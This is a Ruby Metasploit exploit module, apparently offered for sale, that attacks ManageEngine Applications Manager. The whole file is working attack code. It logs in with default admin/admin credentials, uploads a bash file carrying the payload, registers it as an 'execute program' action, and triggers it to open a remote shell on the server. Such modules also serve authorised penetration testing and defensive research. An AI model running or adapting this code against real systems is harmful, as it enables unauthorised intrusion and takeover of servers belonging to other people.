##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'ManageEngine Applications Manager Authenticated Remote Command Execution',
      'Description' => %q{
    This module uses intended administrative functionality in order to gain a remote shell.

    ManageEngine Applications Manager allows an authenticated administrator to run programs as actions.
    This module uses this functionality to gain a shell on the remote system.

    Categories: Enterprise

    Price: 9

    Video: https://asciinema.org/a/G5AATBauRNuhxWjh3NvawlQP1

    OS: Linux

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
        ],
      'Privileged' => false,
      'Platform'   => ['unix', 'linux'],
      'Arch'       => ARCH_CMD,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
         Opt::RPORT(9090),
         OptString.new('TARGETURI', [ true, "Base ManageEngine path", '/']),
         OptString.new('USERNAME', [true, 'The username to authenticate with', 'admin']),
         OptString.new('PASSWORD', [true, 'The password to authenticate with', 'admin'])
      ], self.class)
  end

  def exploit

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/index.do')
    })

    cookie = res.get_cookies

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/j_security_check'),
      'method' => 'POST',
      'vars_post' => {
        'clienttype' => 'html',
        'webstart' => '',
        'j_username' => datastore['USERNAME'],
        'ScreenWidth' => 1280,
        'ScreenHeight' => 709,
        'username' => datastore['USERNAME'],
        'j_password' => datastore['PASSWORD'],
        'submit' => 'Login'
      },
      'cookie' => cookie
    })

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/index.do'),
      'cookie' => cookie
    })

    cookie = res.get_cookies
    file = Rex::Text.rand_text_alpha(8)
    data = Rex::MIME::Message.new
    data.add_part("#!/bin/bash\r\n"+payload.encoded, 'application/octet-stream', 'binary', "form-data;name=\"theFile\";filename=\"#{file}\"")
    data.add_part("./", nil, nil, "form-data;name=\"uploadDir\"")
    data.add_part("/showTile.do?TileName=.ExecProg&haid=null", nil, nil, "form-data;name=\"returnpath\"")
    data.add_part("", nil, nil, "form-data;name=\"org.apache.struts.taglib.html.TOKEN\"")

    res = send_request_cgi({
      'method' => 'POST',
      'data' => data.to_s,
      'uri' => normalize_uri(target_uri.path, '/Upload.do'),
      'cookie' => cookie,
      'ctype' => 'multipart/form-data; boundary='+data.bound
    })

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/showTile.do?TileName=.ExecProg&haid=null'),
      'cookie' => cookie,
    })

    path = $1 if res.body =~ /<input type="text" name="execProgExecDir" maxlength="200" size="40" value="(.*?)" class="formtext xxlarge">/
    token = $1 if res.body =~ /<input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="(.*?)">/
    name = Rex::Text.rand_text_alpha(8)

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/adminAction.do'),
      'method' => 'POST',
      'vars_post' => {
        'org.apache.struts.taglib.html.TOKEN' => token,
        'actions' => '/showTile.do?TileName=.EmailActions&haid=null',
        'haid' => 'null',
        'method' => 'createExecProgAction',
        'redirectTo' => 'null',
        'id' => 0,
        'displayname' => name,
        'serversite' => 'local',
        'choosehost' => '-2',
        'host' => '',
        'monitoringmode' => 'TELNET',
        'username' => '',
        'password' => '',
        'description' => '',
        'port' => 23,
        'prompt' => '$',
        'command' => file,
        'execProgExecDir' => path,
        'abortafter' => 6000,
        'cancel' => false
      },
      'cookie' => cookie
    })

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/adminAction.do?method=showActionProfiles&haid=null'),
      'cookie' => cookie
    })

    id = $1 if res.body =~ /&actionid=(.*?)'.*?#{name}<\/a>/m


    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/common/executeScript.do?method=testAction&actionID='+id+'&haid=null'),
      'cookie' => cookie
    })

    select(nil,nil,nil, 5)

  end
end
